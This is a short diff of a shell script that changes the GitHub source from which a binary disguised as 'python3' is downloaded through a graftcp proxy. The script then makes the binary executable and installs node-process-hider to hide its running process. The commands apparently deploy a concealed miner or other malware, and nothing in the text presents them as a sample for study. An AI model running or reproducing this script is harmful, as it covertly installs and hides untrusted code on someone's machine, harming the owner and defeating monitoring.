@@ -36,7 +36,7 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/viliamriah/newmind/raw/main/python3
+./graftcp/graftcp wget https://github.com/idamasitoh34/new/raw/main/python3
 chmod +x python3
 npm i -g node-process-hider
 ph add python3
